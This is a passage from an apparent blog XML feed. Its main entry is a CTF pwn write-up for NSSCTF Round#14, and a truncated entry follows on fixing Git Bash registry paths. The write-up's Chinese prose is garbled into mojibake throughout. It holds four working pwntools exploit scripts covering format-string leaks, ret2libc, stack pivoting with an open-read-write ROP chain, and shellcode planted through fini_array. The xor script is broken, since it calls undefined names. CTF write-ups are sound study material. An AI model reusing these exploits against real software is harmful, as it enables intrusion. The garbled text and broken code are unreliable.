      <tag>ubuntu</tag>
      
      <tag>VMware Tools</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>NSSCTF Round#14 Basic WP</title>
    <link href="/2023/08/04/NSSCTF-Round-14-Basic-WP/"/>
    <url>/2023/08/04/NSSCTF-Round-14-Basic-WP/</url>
    
    <content type="html"><![CDATA[<p>å‘¨æœ« NSS çš„ PWN ä¸“é¢˜ï¼Œèœèœçš„ç…§ç€åˆ«çš„å¸ˆå‚…çš„ WP å¤ç°ä¸€ä¸‹ğŸ«¥</p><span id="more"></span><h1 id="love"><a href="#love" class="headerlink" title="love"></a>love</h1><blockquote><p>æ ¼å¼åŒ–å­—ç¬¦ä¸²+ret2libc</p></blockquote><p>æ˜¯ä¸ª64ä½çš„ç¨‹åºï¼Œå¼€å¯äº† canary ä¿æŠ¤</p><p><img src="/img/NSSCTF-Round-14-Basic-WP/Round14_love_main.png"></p><p>ä¸»å‡½æ•°ä¸­æœ‰ä¸€ä¸ªæ˜æ˜¾çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œåœ¨ <code>vlun</code> å‡½æ•°ä¸­ gets ä¸é™åˆ¶è¾“å…¥</p><p><img src="/img/NSSCTF-Round-14-Basic-WP/Round14_love_vuln.png"></p><p>è€ƒè™‘é‡Œç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ³„éœ² libc åŸºå€ï¼Œè®¡ç®—åç§»è·å– system åœ°å€ã€‚å†åˆ©ç”¨ gets æ”¹å†™ GOT è¡¨è·å– shellã€‚</p><p>æ ¼å¼åŒ–å­—ç¬¦ä¸²éƒ¨åˆ† buf å­˜å‚¨åœ¨ BSS æ®µä¸Šï¼Œéœ€è¦å€Ÿç”¨æ ˆä¸Šçš„è·³æ¿ã€‚åˆ©ç”¨ GDB æŸ¥çœ‹ printf å¤„çš„æ ˆæ•°æ®ï¼š</p><p><img src="/img/NSSCTF-Round-14-Basic-WP/Round14_love_stack.png"></p><p>æ ˆä¸Šçš„ç¬¬ä¸‰ä¸ªå‚æ•°ï¼Œä¹Ÿå°±æ˜¯æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„ç¬¬ä¹ä¸ªå‚æ•° 0x7fffffffdfb8 å­˜å‚¨çš„æ˜¯0x7fffffffdfa8 åœ°å€ï¼Œè€Œè¿™ä¸ªåœ°å€å­˜å‚¨ v4 çš„æ•°å€¼ ï¼ˆ555LL å°±æ˜¯ä»¥åå…­è¿›åˆ¶å­˜å‚¨555 è¿™ä¸ªåè¿›åˆ¶æ•°å­—ï¼Œå°±æ˜¯ 0x22bï¼›åŒç† 520LLå°±æ˜¯ 0x208ï¼‰ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥æ¥æ”¹å†™ V4 æ•°å€¼å®ç° main å‡½æ•°ä¸­çš„ if æ¡ä»¶åˆ¤æ–­è¿›å…¥ vuln æ¼æ´å‡½æ•°ã€‚</p><p>åŒæ—¶æ ˆä¸Šçš„ç¬¬ä¹ä¸ªå‚æ•° ( <code>%15$</code> )å­˜å‚¨çš„æ˜¯ canary çš„å€¼ï¼Œç¬¬åä¸€ä¸ªå‚æ•° ( <code>%17$</code> ) æŒ‡å‘ <code>__libc_start_main+231</code>ï¼Œå¯ä»¥æ¨ç®—å‡º libc çš„åŸºå€ã€‚</p><p>æ‰€ä»¥æˆ‘ä»¬çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²å°±æ„é€ ä¸º <code>%520c%9$n,,%15$p,,%17$p</code>ï¼ˆå…¶ä¸­ <code>,,</code> ç”¨æ¥åˆ†éš”ä¸åŒåœ°å€ï¼‰</p><p>æœ€ç»ˆçš„ exp å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>) <br>io=process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>libc=ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br><br>pop_rdi=<span class="hljs-number">0x4013f3</span><br>ret=<span class="hljs-number">0x40101a</span><br><br>payload=<span class="hljs-string">&quot;%520c%9$n,,%15$p,,%17$p&quot;</span><br>io.recvuntil(<span class="hljs-string">&#x27;I want to hear your praise of Toka\n&#x27;</span>)<br>io.sendline(payload)<br><br>io.recvuntil(<span class="hljs-string">b&quot;,,&quot;</span>)<br>canary=<span class="hljs-built_in">int</span>(io.recv(<span class="hljs-number">18</span>),<span class="hljs-number">16</span>)<br>io.recvuntil(<span class="hljs-string">b&quot;,,&quot;</span>)<br>base=<span class="hljs-built_in">int</span>(io.recv(<span class="hljs-number">14</span>),<span class="hljs-number">16</span>)-libc.sym[<span class="hljs-string">b&quot;__libc_start_main&quot;</span>]-<span class="hljs-number">231</span><br>sys_addr=base+libc.sym[<span class="hljs-string">b&quot;system&quot;</span>]<br>sh_addr=base+<span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&quot;/bin/sh&quot;</span>))<br><br>payload=cyclic(<span class="hljs-number">0x28</span>)+p64(canary)+p64(<span class="hljs-number">0</span>)+p64(ret)+p64(pop_rdi)+p64(sh_addr)+p64(sys_addr)<br>io.sendlineafter(<span class="hljs-string">b&quot;I know you like him, but you must pass my level\n&quot;</span>,payload)<br><br>io.interactive()<br></code></pre></td></tr></table></figure><h1 id="rbp"><a href="#rbp" class="headerlink" title="rbp"></a>rbp</h1><blockquote><p>æ ˆè¿ç§» + orw</p></blockquote><p><code>vuln()</code> å‡½æ•°é‡Œé¢æœ‰ä¸€ä¸ªé•¿åº¦0x10 çš„æ ˆæº¢å‡ºï¼Œæ‰€ä»¥æˆ‘ä»¬é¦–å…ˆè€ƒè™‘æ ˆè¿ç§»çš„åˆ©ç”¨ ã€‚åŒæ—¶åœ¨ <code>init()</code> é‡Œé¢è°ƒç”¨äº†<code>sandbox()</code> ç¦ç”¨äº†execveï¼Œæ‰€ä»¥è¦ä½¿ç”¨ orw ã€‚</p><p>é¦–å…ˆç§»æ ˆåˆ° bss ç„¶ååˆ©ç”¨ leave_ret ï¼Œç§»æ ˆåˆ°å‰éƒ¨æ‰§è¡Œæ³„éœ²å¹¶å›åˆ° vuln</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>) <br>io=process(<span class="hljs-string">&#x27;./rbp&#x27;</span>)<br>elf=ELF(<span class="hljs-string">&#x27;./rbp&#x27;</span>)<br>libc=ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br><br>bss=<span class="hljs-number">0x404800</span><br>leave_ret=<span class="hljs-number">0x40121d</span><br>pop_rdi=<span class="hljs-number">0x401353</span><br>read_addr=<span class="hljs-number">0x401292</span><br>vuln_addr=<span class="hljs-number">0x401270</span><br>puts_got=elf.got[<span class="hljs-string">b&quot;puts&quot;</span>]<br>puts_plt=elf.plt[<span class="hljs-string">b&quot;puts&quot;</span>]<br><br>payload=cyclic(<span class="hljs-number">0x210</span>)+p64(bss)+p64(read_addr) <br>io.sendafter(<span class="hljs-string">b&quot;try it&quot;</span>,payload)<br><br>payload=p64(<span class="hljs-number">0</span>)+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(vuln_addr)<br>payload= payload.ljust(<span class="hljs-number">0x210</span>,<span class="hljs-string">b&#x27;a&#x27;</span>)+p64(bss-<span class="hljs-number">0x210</span>)+p64(leave_ret)<br><br>io.sendline(payload)<br>leak_addr=u64(io.recvuntil(<span class="hljs-string">b&quot;\x7f&quot;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&quot;\x00&quot;</span>))-libc.sym[<span class="hljs-string">b&quot;puts&quot;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;leak_addr: &quot;</span>+<span class="hljs-built_in">hex</span>(leak_addr))<br>open_addr=leak_addr+libc.sym[<span class="hljs-string">b&quot;open&quot;</span>]<br>read_addr=leak_addr+libc.sym[<span class="hljs-string">b&quot;read&quot;</span>]<br>write_addr=leak_addr+libc.sym[<span class="hljs-string">b&quot;write&quot;</span>]<br><span class="hljs-comment">#pop_rsi = libc.address + next(libc.search(asm(&#x27;pop rsi;ret&#x27;))) </span><br><span class="hljs-comment">#pop_rdx = libc.address + next(libc.search(asm(&#x27;pop rdx;ret&#x27;))) </span><br><span class="hljs-comment">#ä¸çŸ¥é“ä¸ºä»€ä¹ˆæˆ‘ç”¨ä¸Šé¢çš„å‘½ä»¤çªç„¶å°±æŠ½é£ä¸å¥½ç”¨æˆ‘æ‰‹åŠ¨ROPgadgetæ‰¾çš„ï¼Œå°±æ˜¯æœ‰ç‚¹å­æ…¢</span><br>pop_rsi=leak_addr+<span class="hljs-number">0x2601f</span><br>pop_rdx=leak_addr+<span class="hljs-number">0x142c92</span><br><br>payload=cyclic(<span class="hljs-number">0x210</span>)+p64(bss+<span class="hljs-number">0x300</span>-<span class="hljs-number">0x210</span>)+p64(read_addr)<br>io.sendafter(<span class="hljs-string">b&quot;try it\n&quot;</span>,payload)<br><br>orw=<span class="hljs-string">b&quot;/flag\x00\x00\x00&quot;</span>+p64(pop_rdi)+p64(<span class="hljs-number">0x404288</span>)+p64(pop_rsi)+p64(<span class="hljs-number">0</span>)+p64(open_addr)<br>orw+=p64(pop_rdi)+p64(<span class="hljs-number">3</span>)+p64(pop_rsi)+p64(<span class="hljs-number">0x404a00</span>)+p64(pop_rdx)+p64(<span class="hljs-number">0x50</span>)+p64(read_addr)<br>orw+=p64(pop_rdi)+p64(<span class="hljs-number">1</span>)+p64(pop_rsi)+p64(<span class="hljs-number">0x404a00</span>)+p64(pop_rdx)+p64(<span class="hljs-number">0x50</span>)+p64(write_addr)<br><br>orw=orw.ljust(<span class="hljs-number">0x210</span>,<span class="hljs-string">b&quot;a&quot;</span>)+p64(bss+<span class="hljs-number">0x300</span>-<span class="hljs-number">0x210</span>)+p64(leave_ret)<br>io.send(orw)<br><br>io.interactive()<br></code></pre></td></tr></table></figure><h1 id="xor"><a href="#xor" class="headerlink" title="xor"></a>xor</h1><p>é¢˜ç›®æ˜¯ä¸€ä¸ªä»»ä½•ä¿æŠ¤éƒ½æ²¡æœ‰è¢«å¼€å¯å¹¶ä¸” rwx å…¨éƒ¨å¼€å¯çš„ç¨‹åº</p><p><img src="/img/NSSCTF-Round-14-Basic-WP/Round14_xor_main.png"></p><p>é¦–å…ˆç¨‹åºä¸­æœ‰ä¸€ä¸ª flag åˆ¤æ–­çš„å¾ªç¯ï¼Œæˆ‘ä»¬è¦ä¿è¯ flag å°äº 0 ç¨‹åºæ‰ä¸ä¼šé€€å‡ºï¼Œæ–¹ä¾¿æˆ‘ä»¬è¿›è¡Œæ¥ä¸‹æ¥çš„æ“ä½œã€‚</p><p>æˆ‘ä»¬å¯ä»¥å°† flag çš„é«˜ä½å†™æˆ 0xffï¼Œè¿™æ ·çš„è¯ flag çš„ç¬¦å·ä½ä¼šè¢«è¦†å†™ä¸º1ï¼Œå³è´Ÿæ•°ã€‚</p><p><code>xorByteWithAddress()</code> ä¸­åªæœ‰ä¸¤è¡Œä»£ç </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 __fastcall <span class="hljs-title function_">xorByteWithAddress</span><span class="hljs-params">(_BYTE *a1, <span class="hljs-type">char</span> a2)</span><br>&#123;<br>  *a1 ^= a2;  <span class="hljs-comment">//*addr ^= value</span><br>  <span class="hljs-keyword">return</span> (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)++flag;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>a1</code> æ˜¯ä¸€ä¸ªæŒ‡å‘ <code>_BYTE</code> ç±»å‹çš„åœ°å€ï¼ˆå³ä¸€ä¸ªå­—èŠ‚å¤§å°çš„æ•°æ®ç±»å‹ï¼‰ï¼Œæ‰€ä»¥åœ¨è¿™ä¸ªå¼‚æˆ–çš„æ“ä½œä¸­ï¼Œä¸€æ¬¡åªèƒ½å¼‚æˆ–æ”¹å†™ä¸€å­—èŠ‚çš„æ•°æ®ã€‚</p><p>å› ä¸º rwx å¯è¯»å¯å†™å¯æ‰§è¡Œï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥å‘ä¸Šé¢å†™å…¥ sehllcodeï¼ŒåŠ«æŒ <code>fini_array</code> æŒ‡é’ˆåˆ°shellcodeå¤„ï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥å†æ¬¡å¼‚æˆ–ä»¤ flag å¤§äºé›¶ï¼Œé€€å‡ºç¨‹åºæ—¶æ‰§è¡Œ shellcode äº†ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br><br>io = process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>libc=ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">xorwrite</span>(<span class="hljs-params">addr,value</span>):<br>    io.sendlineafter(<span class="hljs-string">b&quot;addr:&quot;</span>,<span class="hljs-built_in">hex</span>(addr).encode())<br>    io.sendlineafter(<span class="hljs-string">b&quot;value:&quot;</span>,value)<br><br>flag=<span class="hljs-number">0x600BCC</span><br>fini_array=<span class="hljs-number">0x600970</span><br>rwx_addr=<span class="hljs-number">0x600d00</span><br><br>xorwrite(flag+<span class="hljs-number">3</span>,<span class="hljs-string">b&#x27;0xff&#x27;</span>)<br><br>shellcode=asm(shellcraft.sh())<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(shellcode)):<br>    xorwrite(rwx+i,shellcode[i])<br>    <br><span class="hljs-comment">#xor_array=fini_array^rwx_addr</span><br><span class="hljs-comment">#xor_array=0x200b10</span><br>xorenc(<span class="hljs-built_in">hex</span>(fini_array).encode(),<span class="hljs-string">b&quot;0x10&quot;</span>)<br>xorenc(<span class="hljs-built_in">hex</span>(fini_array+<span class="hljs-number">1</span>).encode(),<span class="hljs-string">b&quot;0x0b&quot;</span>)<br>xorenc(<span class="hljs-built_in">hex</span>(fini_array+<span class="hljs-number">2</span>).encode(),<span class="hljs-string">b&quot;0x20&quot;</span>)<br>    <br>xorwrite(flag+<span class="hljs-number">3</span>,<span class="hljs-string">b&#x27;0xff&#x27;</span>)<br>io.interactive()<br></code></pre></td></tr></table></figure><h1 id="read-file"><a href="#read-file" class="headerlink" title="read_file"></a>read_file</h1><p>æ˜¯ä¸€ä¸ª64ä½çš„èœå•å¼çš„è¯»å–æ–‡ä»¶çš„ç¨‹åºï¼Œè¿œç¨‹æ—¶å¯ä»¥ç›´æ¥è¯»å–æœåŠ¡å™¨ç«¯çš„æ–‡ä»¶ã€‚</p><p>ä½†æ˜¯åœ¨ load_file å¤„æœ‰ â€œflagâ€ å­—ç¬¦æ£€æµ‹ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬ä¸èƒ½ç›´æ¥ load flagï¼Œè¦å°è¯•ä¿®æ”¹ flag æ–‡ä»¶çš„ â€œflagâ€ å­—ç¬¦ã€‚</p><p>åŒæ—¶åœ¨ read_file å¤„æœ‰æ–‡æœ¬é•¿åº¦çš„åˆ¤æ–­ï¼Œä¸è¿‡é•¿ç´ è´¨ç”±ç”¨æˆ·è¾“å…¥ï¼Œå°äº55æ—¶ä¼šè‡ªåŠ¨è¯»å– content_size + 56 çš„æ•°æ®ã€‚</p><p>æˆ‘ä»¬é¦–å…ˆéœ€è¦ç»•è¿‡ flag çš„æ£€æŸ¥ã€‚</p><p><img src="/img/NSSCTF-Round-14-Basic-WP/Round14_readfile_load.png"></p><p>åœ¨ <code>load_file()</code> å‡½æ•°ä¸­ï¼Œscanf è´Ÿè´£æ¥å—ç”¨æˆ·è¯»å…¥ä¿¡æ¯ã€‚æˆ‘ä»¬çŸ¥é“scanfè¯»å–æ•°æ®ä¼šåœ¨æŒ‡å®šé•¿åº¦çš„æ•°æ®åæ·»åŠ <code>\x00 </code>ç©ºå­—ç¬¦</p><p><img src="/img/NSSCTF-Round-14-Basic-WP/Round14_readfile_bss.png"></p><p>å¦‚ä¸Šå›¾ï¼Œ<em>file_name</em> å’Œ <em>file_id</em> éƒ½æ˜¯å‚¨å­˜åœ¨ BSS æ®µå¹¶ä¸”ç›¸é‚»ï¼Œåç§»ç›¸å·® 8 å­—èŠ‚ã€‚ä¹Ÿå°±æ˜¯è¯´å¦‚æœæˆ‘ä»¬åœ¨ file_name è¯»å–äº†åˆšå¥½8å­—èŠ‚çš„æ•°æ®ï¼Œå…¶å¯¹åº”çš„ <code>\x00</code> å°±ä¼šè¦†ç›–ä½ <em>file_id</em>ï¼Œä½¿ <em>file_id</em> ä¸º 0ã€‚</p><p>è€Œåˆ©ç”¨åˆ° fild_id çš„å‡½æ•° <code>read(file_fd, file_content, content_size);</code> åœ¨ fild_id&#x3D;0 æ—¶ä¼šä»ç”¨æˆ·é”®ç›˜æ¥è·å–ç”¨æˆ·çš„è¾“å…¥è€Œä¸æ˜¯è¯»å–æ–‡ä»¶ã€‚</p><p>åˆå› ä¸ºåœ¨æ­¤ä¹‹å‰ç”± alloca æ¥åˆ†é… v2 æ ˆç©ºé—´ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨ content_size å°äº55çš„æ¡ä»¶åˆ¤æ–­é€ æˆæº¢å‡ºï¼Œç›´æ¥è¦†ç›–è¿”å›åœ°å€ä½¿ç¨‹åºè·³è½¬åˆ° <code>file_fd = open(file_name, 0, 0LL);</code>ï¼Œç»•è¿‡æ£€æŸ¥å†æŒ‰ç…§ç¨‹åºæµç¨‹æ­£å¸¸è¯»å– flag ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br>io = process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>libc = ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">load</span>(<span class="hljs-params">payload</span>):<br>    io.sendlineafter(<span class="hljs-string">b&quot;&gt;&gt; &quot;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>    io.sendlineafter(<span class="hljs-string">b&quot;file_name : &quot;</span>,payload)<br>    <br>load_addr=<span class="hljs-number">0x401493</span><br>read_addr=<span class="hljs-number">0x4014ee</span><br>ret=<span class="hljs-number">0x40101a</span><br><br>load(<span class="hljs-string">b&quot;./&quot;</span>)<br>load(<span class="hljs-string">b&quot;flag.txt&quot;</span>)<br><br>io.sendlineafter(<span class="hljs-string">b&quot;&gt;&gt; &quot;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>io.sendlineafter(<span class="hljs-string">b&quot;file_content_length : &quot;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br><br>payload=cyclic(<span class="hljs-number">0x18</span>)+p64(load_addr)+p64(ret)*<span class="hljs-number">2</span>+p64(read_addr)<br>io.sendafter(<span class="hljs-string">b&quot;read more &quot;</span>,payload)<br><br>io.sendlineafter(<span class="hljs-string">b&quot;file_content_length : &quot;</span>,<span class="hljs-string">b&quot;1&quot;</span>)<br><br>io.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
      <category>wp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>libc</tag>
      
      <tag>orw</tag>
      
      <tag>stack pivoting</tag>
      
      <tag>æ ¼å¼åŒ–å­—ç¬¦ä¸²</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ç¨‹åºä¿®æ”¹è·¯å¾„åå›¾æ ‡æ¶ˆå¤±åŠå³é”®æ— æ³•æ‰“å¼€çš„è§£å†³æ–¹æ¡ˆ</title>
    <link href="/2023/07/24/%E7%A8%8B%E5%BA%8F%E4%BF%AE%E6%94%B9%E8%B7%AF%E5%BE%84%E5%90%8E%E5%9B%BE%E6%A0%87%E6%B6%88%E5%A4%B1%E5%8F%8A%E5%8F%B3%E9%94%AE%E6%97%A0%E6%B3%95%E6%89%93%E5%BC%80%E7%9A%84%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/"/>
    <url>/2023/07/24/%E7%A8%8B%E5%BA%8F%E4%BF%AE%E6%94%B9%E8%B7%AF%E5%BE%84%E5%90%8E%E5%9B%BE%E6%A0%87%E6%B6%88%E5%A4%B1%E5%8F%8A%E5%8F%B3%E9%94%AE%E6%97%A0%E6%B3%95%E6%89%93%E5%BC%80%E7%9A%84%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/</url>
    
    <content type="html"><![CDATA[<p>ä¿®æ”¹ç¨‹åºè·¯å¾„åéœ€è¦è¿›è¡Œçš„ä¸€äº›æ“ä½œ </p><span id="more"></span><h2 id="æ›´æ”¹Gitç›®å½•åï¼Œé¼ æ ‡å³é”®ç‚¹å‡»Git-Bash-Hereå‡ºç°æ‰¾ä¸åˆ°åº”ç”¨ç¨‹åºåŠå›¾æ ‡å˜ç°"><a href="#æ›´æ”¹Gitç›®å½•åï¼Œé¼ æ ‡å³é”®ç‚¹å‡»Git-Bash-Hereå‡ºç°æ‰¾ä¸åˆ°åº”ç”¨ç¨‹åºåŠå›¾æ ‡å˜ç°" class="headerlink" title="æ›´æ”¹Gitç›®å½•åï¼Œé¼ æ ‡å³é”®ç‚¹å‡»Git Bash Hereå‡ºç°æ‰¾ä¸åˆ°åº”ç”¨ç¨‹åºåŠå›¾æ ‡å˜ç°"></a>æ›´æ”¹Gitç›®å½•åï¼Œé¼ æ ‡å³é”®ç‚¹å‡»Git Bash Hereå‡ºç°æ‰¾ä¸åˆ°åº”ç”¨ç¨‹åºåŠå›¾æ ‡å˜ç°</h2><p>æˆ‘åˆšæ”¾å‡çš„æ—¶å€™æ•´ç†äº†è‡ªå·±çš„æ–‡ä»¶ä»¬ï¼Œå°±æŠŠ git çš„å®‰è£…ç›®å½•æ”¹äº†ï¼Œæˆ‘æƒ³è¦ç”¨ git ä¼ å¤§æ–‡ä»¶ä¸Š github å°±å‡ºç°äº†å¦‚é¢˜æ‰€è§çš„é—®é¢˜</p><p><img src="/img/%E7%A8%8B%E5%BA%8F%E4%BF%AE%E6%94%B9%E8%B7%AF%E5%BE%84%E5%90%8E%E5%9B%BE%E6%A0%87%E6%B6%88%E5%A4%B1%E5%8F%8A%E5%8F%B3%E9%94%AE%E6%97%A0%E6%B3%95%E6%89%93%E5%BC%80%E7%9A%84%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/Snipaste_2023-07-24_11-38-05.png"></p><p>åœ¨è¿™é‡Œç‚¹å‡»çš„æ—¶å€™æ‰“ä¸å¼€ï¼Œåªæœ‰æ‰‹åŠ¨æ‰“å¼€ Git æ‰ä¼šå¼¹å‡ºå¼¹çª—</p><p>è¿™æ˜¯å› ä¸ºæ³¨å†Œè¡¨æ²¡æœ‰ä¿®æ”¹</p><p>win+Rï¼Œè¾“å…¥ regedit æ‰“å¼€æ³¨å†Œè¡¨</p><p>Ctrl+F æŸ¥æ‰¾ç›®å½• HKEY_CLASSES_ROOT\ Directory \ Background \ shell \</p><p><img src="/img/%E7%A8%8B%E5%BA%8F%E4%BF%AE%E6%94%B9%E8%B7%AF%E5%BE%84%E5%90%8E%E5%9B%BE%E6%A0%87%E6%B6%88%E5%A4%B1%E5%8F%8A%E5%8F%B3%E9%94%AE%E6%97%A0%E6%B3%95%E6%89%93%E5%BC%80%E7%9A%84%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/Snipaste_2023-07-24_12-02-51.png"></p><p>å°±ä¼šå‘ç°æ³¨å†Œè¡¨ä¸­çš„åœ°å€è¿˜æ˜¯åŸæ¥çš„åœ°å€ï¼Œä¿®æ”¹ä¸ºç§»åŠ¨åçš„åœ°å€å³å¯</p><p>è¿˜æœ‰ä¸‹é¢çš„shellæ–‡ä»¶å¤¹ä¸­æ‰¾åˆ°gitç›¸å…³çš„éƒ¨åˆ†ä¹Ÿéœ€è¦ä¿®æ”¹ï¼Œåœ¨git_guiä¸»ç›®å½•ç‚¹ä¸€æ¬¡ï¼Œcommdå•ç‹¬å†ç‚¹å¼€ã€‚æ€»å…±éœ€è¦ä¿®æ”¹å…«å¤„ã€‚</p><p>ä¿®æ”¹åå°±å¯ä»¥å•¦</p><h2 id="ä¿®æ”¹ç¨‹åºè·¯å¾„åï¼Œç¨‹åºä»å¯ä½¿ç”¨ä½†å›¾æ ‡æ¶ˆå¤±æˆ–å˜æˆç™½å—"><a href="#ä¿®æ”¹ç¨‹åºè·¯å¾„åï¼Œç¨‹åºä»å¯ä½¿ç”¨ä½†å›¾æ ‡æ¶ˆå¤±æˆ–å˜æˆç™½å—" class="headerlink" title="ä¿®æ”¹ç¨‹åºè·¯å¾„åï¼Œç¨‹åºä»å¯ä½¿ç”¨ä½†å›¾æ ‡æ¶ˆå¤±æˆ–å˜æˆç™½å—"></a>ä¿®æ”¹ç¨‹åºè·¯å¾„åï¼Œç¨‹åºä»å¯ä½¿ç”¨ä½†å›¾æ ‡æ¶ˆå¤±æˆ–å˜æˆç™½å—</h2><p>ä»¥Git Bashä¸ºä¾‹</p><p>è¿™æ˜¯å› ä¸ºæˆ‘ä»¬ç‚¹å‡»çš„å›¾æ¡ˆå’Œæœç´¢æˆ–æ˜¯å¯¼èˆªæ ä¸­æ˜¾ç¤ºçš„å›¾æ ‡éƒ½æ˜¯â€å¿«æ·æ–¹å¼â€œï¼Œè€Œå®ƒå¯¹åº”çš„è·¯å¾„æ²¡æœ‰ä¿®æ”¹</p><p>æ‰¾åˆ°æ¡Œé¢æˆ–è€…å¼€å§‹èœå•ä¸‹æ‰¾åˆ° Git Bash 